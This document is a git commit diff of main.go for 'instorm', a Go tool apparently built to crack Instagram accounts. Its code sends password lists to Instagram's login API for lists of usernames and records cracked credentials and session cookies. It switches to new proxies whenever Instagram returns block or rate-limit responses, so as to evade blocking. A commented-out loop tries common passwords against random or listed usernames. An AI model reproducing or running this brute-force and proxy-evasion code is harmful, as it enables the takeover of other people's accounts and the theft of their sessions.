4903efd777e488040bde2ba2264b88e3d503c00c
Instagram: @fenllz <43064437+JustGhostz@users.noreply.github.com>
2020-05-27 05:33:37 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,7 +1,13 @@
 package main
 
 import (
+	"bufio"
+	"compress/gzip"
 	"fmt"
+	"io"
+	"io/ioutil"
+	"net/http"
+	"net/http/httputil"
 	"net/url"
 	"os"
 	"os/user"
@@ -29,10 +35,18 @@ var ThreadsPerMoment int
 var cookiesPath string
 var LoopFails bool
 var SleepTime int = 0
-var InstaAPI API = GetAPI()
+var att int = 0
+var InstaAPI API
 
+var MyIP string = ""
 var Proxy string = ""
-var ProxyType string = ""
+var TotalUploadBandWidthInBytes float64
+var TotalDownloadBandWidthInBytes float64
+
+const KB float64 = 1000.0       // 10^3
+const MB float64 = 1000000.0    // 10^6
+const GB float64 = 1000000000.0 // 10^9
+
 var ProxyCounter int = 0
 var Proxies []string = []string{}
 var HTTP []string = []string{}
@@ -48,6 +62,96 @@ var homeDict string = ""
 
 func main() {
 
+	// _, _, Proxies := GetProxies()
+
+	// for i := 0; i < len(Proxies); i++ {
+
+	// 	Proxy = Proxies[i]
+	// 	println(Proxy)
+
+	// 	req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
+	// 	url_proxy := &url.URL{Host: Proxy}
+
+	// 	// http.DefaultTransport = &http.Transport{Proxy: http.ProxyURL(url_proxy)}
+	// 	// client := &http.Client{Timeout: time.Second * 60}
+
+	// 	client := &http.Client{
+	// 		Transport: &http.Transport{Proxy: http.ProxyURL(url_proxy)},
+	// 		Timeout:   time.Second * 60,
+	// 	}
+
+	// 	resp, err := client.Do(req)
+	// 	if err != nil {
+	// 		println(err.Error())
+	// 	} else {
+	// 		var reader io.ReadCloser
+	// 		switch resp.Header.Get("Content-Encoding") {
+	// 		case "gzip":
+	// 			reader, _ = gzip.NewReader(resp.Body)
+	// 			defer reader.Close()
+	// 		default:
+	// 			reader = resp.Body
+	// 		}
+	// 		body, _ := ioutil.ReadAll(reader)
+	// 		res := string(body)
+	// 		println(res)
+	// 		//break
+	// 	}
+	// }
+
+	// time.Sleep(time.Second * 1)
+
+	// //}
+
+	// os.Exit(0)
+
+	// passwords := []string{"1qazxsw2", "1qaz2wsx", "instagram123", "123password321"}
+
+	// // for {
+	// // 	us := GenerateRandomString(4, true, false, true, false, true)
+	// // 	for i := 0; i < len(passwords); i++ {
+	// // 		res := login(us, passwords[i], Proxy, true, InstaAPI)
+	// // 		fmt.Println(us, passwords[i])
+	// // 		fmt.Println(res.Body)
+	// // 		time.Sleep(time.Second * 1)
+	// // 		if strings.Contains(res.Body, "sentry_block") || strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "wait") {
+	// // 			if ProxyCounter == len(Proxies)-1 {
+	// // 				HTTPS, HTTP, Proxies = GetProxies()
+	// // 				ProxyCounter = 0
+	// // 			}
+	// // 			Proxy = Proxies[ProxyCounter]
+	// // 			ProxyCounter++
+	// // 			continue
+	// // 		}
+	// // 	}
+	// // 	time.Sleep(time.Second * 5)
+
+	// // }
+
+	// list, _ := readLines("/Users/Ali/Documents/usernames/0.txt")
+	// for n := 0; n < len(list); n++ {
+	// 	for i := 0; i < len(passwords); i++ {
+	// 		res := login(list[n], passwords[i], Proxy, true, InstaAPI)
+	// 		fmt.Println(list[n], passwords[i])
+	// 		fmt.Println(res.Body)
+	// 		time.Sleep(time.Second * 1)
+	// 		if strings.Contains(res.Body, "sentry_block") || strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "wait") {
+	// 			if ProxyCounter == 0 {
+	// 				HTTPS, HTTP, Proxies = GetProxies()
+	// 			}
+	// 			if ProxyCounter == len(Proxies)-1 {
+	// 				HTTPS, HTTP, Proxies = GetProxies()
+	// 				ProxyCounter = 0
+	// 			}
+	// 			Proxy = Proxies[ProxyCounter]
+	// 			ProxyCounter++
+	// 			continue
+	// 		}
+	// 	}
+	// 	time.Sleep(time.Second * 5)
+
+	// }
+
 	// Do it without threads!
 	user, _ := user.Current()
 	homeDict = user.HomeDir
@@ -59,13 +163,28 @@ func progress() {
 
 	for {
 
-		output := [6]string{}
+		TotalGBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/GB)
+		TotalMBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/MB)
+		TotalKBUploaded := fmt.Sprintf("%f", TotalUploadBandWidthInBytes/KB)
+		TotalGBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/GB)
+		TotalMBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/MB)
+		TotalKBDownloaded := fmt.Sprintf("%f", TotalDownloadBandWidthInBytes/KB)
+
+		TotalGB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/GB)
+		TotalMB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/MB)
+		TotalKB := fmt.Sprintf("%f", (TotalUploadBandWidthInBytes+TotalDownloadBandWidthInBytes)/KB)
+
+		output := [10]string{}
 		output[0] = fmt.Sprintf("\u001b[38;5;50m%s\u001b[0m \u001b[38;5;242m%s\u001b[0m", "Progress", "[")
-		output[1] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", len(wrong))
-		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Secured accounts", len(secure))
-		output[3] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Cracked account", len(cracked))
-		output[4] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Fails attempts", Fails)
-		output[5] = fmt.Sprintf("\u001b[38;5;242m%s\u001b[0m", "]")
+		output[1] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Attempts", att)
+		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", len(wrong))
+		output[3] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Secured accounts", len(secure))
+		output[4] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Cracked account", len(cracked))
+		output[5] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Fails attempts", Fails)
+		output[6] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total Upload BandWidth", TotalKBUploaded+" KB "+"- "+TotalMBUploaded+" MB "+"- "+TotalGBUploaded+" GB")
+		output[7] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total Download BandWidth", TotalKBDownloaded+" KB "+"- "+TotalMBDownloaded+" MB "+"- "+TotalGBDownloaded+" GB")
+		output[8] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Total BandWidth", TotalKB+" KB "+"- "+TotalMB+" MB "+"- "+TotalGB+" GB")
+		output[9] = fmt.Sprintf("\u001b[38;5;242m%s\u001b[0m", "]")
 
 		for i := 0; i < len(output); i++ {
 			fmt.Println(output[i])
@@ -84,6 +203,45 @@ func progress() {
 
 func Start() {
 
+	//_InstaAPI, APIUploadBandWidth, APIDownloadBandWidth := GetAPI()
+	_InstaAPI := GetAPI()
+	APIUploadBandWidth := float64(0)
+	APIDownloadBandWidth := float64(0)
+	InstaAPI = _InstaAPI
+
+	TotalUploadBandWidthInBytes += APIUploadBandWidth
+	TotalDownloadBandWidthInBytes += APIDownloadBandWidth
+
+	req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
+	client := &http.Client{}
+
+	ReqBytes, _ := httputil.DumpRequestOut(req, true)
+	RequestSizeByBytes := float64(len(ReqBytes))
+	TotalUploadBandWidthInBytes += RequestSizeByBytes
+
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
+	ResBytes, _ := httputil.DumpResponse(resp, true)
+	ResponseSizeByBytes := float64(len(ResBytes))
+	TotalDownloadBandWidthInBytes += ResponseSizeByBytes
+
+	var reader io.ReadCloser
+	if resp.Header.Get("Content-Encoding") == "gzip" {
+		reader, _ = gzip.NewReader(resp.Body)
+		defer reader.Close()
+	} else {
+		reader = resp.Body
+	}
+	IP, err := ioutil.ReadAll(reader)
+	if err != nil {
+		panic(err)
+	}
+	MyIP = string(IP)
+
 	HTTPS, HTTP, Proxies = GetProxies()
 
 	var choice string
@@ -100,7 +258,7 @@ func Start() {
 	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")
 
 	_, _ = R.Println("")
-	color.Blue("By BlackHole, inst: @fenllz")
+	color.Blue("By BlackHole, inst: @ctpe")
 	fmt.Println()
 
 	_, _ = G.Print("Do you wanna set sleep time (Recommended) [y/n]: ")
@@ -175,14 +333,14 @@ func Start() {
 		passPath = homeDict + "/" + passPath
 
 		if passPath != homeDict+"/" && CheckPathToFile(passPath) {
-			passwords, _ = readLines(passPath)
-			if len(passwords) <= 0 {
-				print("\033[F")
-				print("\033[K")
-				_, _ = R.Print("The list is empty\r")
-				time.Sleep(time.Second * 1)
-				continue
-			}
+			// passwords, _ = readLines(passPath)
+			// if len(passwords) <= 0 {
+			// 	print("\033[F")
+			// 	print("\033[K")
+			// 	_, _ = R.Print("The list is empty\r")
+			// 	time.Sleep(time.Second * 1)
+			// 	continue
+			// }
 			break
 		} else {
 			print("\033[F")
@@ -297,7 +455,7 @@ func Start() {
 	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")
 
 	_, _ = R.Println("")
-	color.Blue("By BlackHole, inst: @fenllz")
+	color.Blue("By BlackHole, inst: @ctpe")
 	fmt.Println()
 
 	go func() {
@@ -315,27 +473,120 @@ func Start() {
 	_, _ = R.Println("/_//_/ /_/____/\\__/\\____/_/  /_/ /_/ /_/ ")
 
 	_, _ = R.Println("")
-	color.Blue("By BlackHole, inst: @fenllz")
+	color.Blue("By BlackHole, inst: @ctpe")
 	fmt.Println()
 
-	_, _ = G.Println("For any bug, just contact with me at instagram @fenllz,")
+	_, _ = G.Println("For any bug, just contact me at instagram @ctpe,")
 	_, _ = G.Println("Thank you for using instorm, and I hope you have a nice day :)")
 
 }
+
+var Blocked = false
 
 func Check(us string) {
 	if counter >= len(users) {
 		return
 	}
 	counter++
-	for i := 0; i < len(passwords); i++ {
+
+	file, _ := os.Open(passPath)
+	scanner := bufio.NewScanner(file)
+
+	done := false
+
+	for scanner.Scan() { //for i := 0; i < len(passwords); i++ {
 		belong := 0
 		for {
-			res := login(us, passwords[i], Proxy, ProxyType, true, InstaAPI)
-			instorm_log = append(instorm_log, res.Body)
-			_ = writeLines(instorm_log, homeDict+"/"+"instorm_log")
-			if strings.Contains(res.Body, "logged_in_user") {
+			// Check Proxy
+			if Blocked {
+				for {
 
+					req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
+					url_proxy := &url.URL{Host: Proxy}
+					client := &http.Client{
+						Transport: &http.Transport{Proxy: http.ProxyURL(url_proxy)},
+						Timeout:   time.Second * 10,
+					}
+
+					ReqBytes, _ := httputil.DumpRequestOut(req, true)
+					RequestSizeByBytes := float64(len(ReqBytes))
+					TotalUploadBandWidthInBytes += RequestSizeByBytes
+
+					resp, err := client.Do(req)
+					if err != nil {
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
+						}
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						continue
+					}
+
+					ResBytes, _ := httputil.DumpResponse(resp, true)
+					ResponseSizeByBytes := float64(len(ResBytes))
+					TotalDownloadBandWidthInBytes += ResponseSizeByBytes
+
+					defer resp.Body.Close()
+					body, err := ioutil.ReadAll(resp.Body)
+					_body := string(body)
+					IP := strings.Split(Proxy, ":")[0]
+					if err != nil && IP != _body {
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
+						}
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						continue
+					}
+					break
+				}
+			}
+			//
+			res := login(us, scanner.Text(), Proxy, true, InstaAPI, 15000)
+			att++
+			TotalUploadBandWidthInBytes += res.RequestSizeByBytes
+			TotalDownloadBandWidthInBytes += res.ResponseSizeByBytes
+
+			currentTime := time.Now().Format("2006-01-02 15:04:05 PM Monday")
+
+			if Proxy != "" {
+				instorm_log = append(instorm_log,
+					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
+						"------------------------------------------------"+"\n"+
+						"Time & Date: "+currentTime+"\n"+
+						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
+						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
+						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
+						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
+						"username: "+us+"\n"+
+						"password: "+scanner.Text()+"\n"+
+						"Response: "+res.Body+"\n"+
+						"error: "+res.Err+"\n"+
+						"Proxy: "+Proxy+"\n"+
+						"------------------------------------------------"+"\n")
+			} else {
+				instorm_log = append(instorm_log,
+					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
+						"------------------------------------------------"+"\n"+
+						"Time & Date: "+currentTime+"\n"+
+						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
+						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
+						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
+						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
+						"username: "+us+"\n"+
+						"password: "+scanner.Text()+"\n"+
+						"Response: "+res.Body+"\n"+
+						"error: "+res.Err+"\n"+
+						"------------------------------------------------"+"\n")
+			}
+			_ = writeLines(instorm_log, homeDict+"/"+"instorm_log")
+			if !strings.Contains(res.Body, "sentry_block") && !strings.Contains(res.Body, "ip_block") && !strings.Contains(res.Body, "Please wait") {
+				Blocked = false
+			}
+			if strings.Contains(res.Body, "logged_in_user") {
+				done = true
 				_url, _ := url.Parse("https://i.instagram.com/api/v1/accounts/login/")
 				var cokkies = res.Cookies.Cookies(_url)
 				var sessionid string
@@ -348,13 +599,13 @@ func Check(us string) {
 
 				if cookiesPath != "" {
 					if !ssliceContains(cookies, us) && us != "" {
-						cookies = append(cookies, us+":"+passwords[i]+":"+sessionid)
+						cookies = append(cookies, us+":"+scanner.Text()+":"+sessionid)
 					}
 					_ = writeLines(cookies, cookiesPath)
 				}
 
 				if !ssliceContains(cracked, us) && us != "" {
-					cracked = append(cracked, us+":"+passwords[i])
+					cracked = append(cracked, us+":"+scanner.Text())
 				}
 
 				if crackPath != "" {
@@ -368,83 +619,107 @@ func Check(us string) {
 			} else if strings.Contains(res.Body, "secure") || strings.Contains(res.Body, "unusable_password") ||
 				strings.Contains(res.Body, "checkpoint_challenge_required") || strings.Contains(res.Body, "challenge_required") {
 				if !ssliceContains(secure, us) && us != "" {
-					secure = append(secure, us+":"+passwords[i])
+					secure = append(secure, us+":"+scanner.Text())
 				}
 				if securePath != "" {
 					_ = writeLines(secure, securePath)
 				}
 			} else if strings.Contains(res.Body, "bad_password") || strings.Contains(res.Body, "invalid_user") {
 				if !ssliceContains(wrong, us) && us != "" {
-					wrong = append(wrong, us+":"+passwords[i])
+					wrong = append(wrong, us+":"+scanner.Text())
 				}
-			} else if strings.Contains(res.Body, "Oops, an error occurred.") || (strings.Contains(strings.ToLower(res.Body), "wait") && strings.Contains(strings.ToLower(res.Body), "few")) {
+			} else if strings.Contains(res.Body, "Oops, an error occurred.") {
 				if LoopFails {
-					if SleepTime != 0 {
-						time.Sleep(time.Second * time.Duration(SleepTime+15))
-						continue
-					}
-					time.Sleep(time.Millisecond * 20000)
+					time.Sleep(time.Millisecond * 10000)
 					continue
 				} else {
-					if !ssliceContains(wrong, us) && us != "" {
-						wrong = append(wrong, us+":"+passwords[i])
-					}
 					Fails++
+					continue
 				}
-			} else if strings.Contains(res.Body, "belong to an account") && !strings.Contains(res.Body, "ip_block") {
+			} else if (strings.Contains(res.Body, "belong to an account") && !strings.Contains(res.Body, "ip_block")) || strings.Contains(res.Body, "Please wait") || res.Body == "" {
 				if LoopFails {
-					if belong < 3 {
-						if SleepTime != 0 {
-							time.Sleep(time.Second * time.Duration(SleepTime+15))
-							continue
-						}
-						time.Sleep(time.Millisecond * 20000)
-						belong++
+					time.Sleep(time.Millisecond * 10000)
+					belong++
+					if res.Body == "" && !(belong > 3) {
+						time.Sleep(time.Millisecond * 5000) //temporary
 						continue
-					} else {
-						if !ssliceContains(wrong, us) && us != "" {
-							wrong = append(wrong, us+":"+passwords[i])
+					}
+					if belong > 3 {
+						Blocked = true
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
 						}
-						Fails++
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						belong = 0
 					}
+					continue
 				} else {
-					if !ssliceContains(wrong, us) && us != "" {
-						wrong = append(wrong, us+":"+passwords[i])
+					belong++
+					if res.Body == "" && !(belong > 3) {
+						time.Sleep(time.Millisecond * 5000) //temporary
+						continue
 					}
-					Fails++
+					belong = 0
+					Blocked = true
+					if ProxyCounter == len(Proxies)-1 {
+						HTTPS, HTTP, Proxies = GetProxies()
+						ProxyCounter = 0
+					}
+					Proxy = Proxies[ProxyCounter]
+					ProxyCounter++
+					belong = 0
+					continue
 				}
 			} else if strings.Contains(res.Body, "ip_block") || strings.Contains(res.Body, "sentry_block") {
+				Blocked = true
 				if ProxyCounter == len(Proxies)-1 {
 					HTTPS, HTTP, Proxies = GetProxies()
 					ProxyCounter = 0
 				}
 				Proxy = Proxies[ProxyCounter]
-				ProxyType = strings.Split(Proxy, "://")[0]
 				ProxyCounter++
 				continue
 			} else {
 				if LoopFails {
-					if SleepTime != 0 {
-						time.Sleep(time.Second * time.Duration(SleepTime+15))
+					time.Sleep(time.Millisecond * 10000)
+					belong++
+					if res.Body == "" && res.Err != "null" {
+						time.Sleep(time.Millisecond * 5000) //temporary
 						continue
 					}
-					time.Sleep(time.Millisecond * 20000)
+					if belong > 3 {
+						Blocked = true
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
+						}
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						belong = 0
+					}
 					continue
 				} else {
-					if !ssliceContains(wrong, us) && us != "" {
-						wrong = append(wrong, us+":"+passwords[i])
-					}
 					Fails++
+					continue
 				}
 			}
-			time.Sleep(time.Second * 1)
+			if SleepTime != 0 {
+				rands := RandRange(0, 3)
+				time.Sleep(time.Second * time.Duration(SleepTime+rands))
+			}
 			break
 
 		}
+		if done {
+			break
+		}
 	}
-	if SleepTime != 0 {
-		time.Sleep(time.Second * time.Duration(SleepTime))
-	}
+	file.Close()
+	// if SleepTime != 0 {
+	// 	time.Sleep(time.Second * time.Duration(SleepTime))
+	// }
 }
 
 func process() {
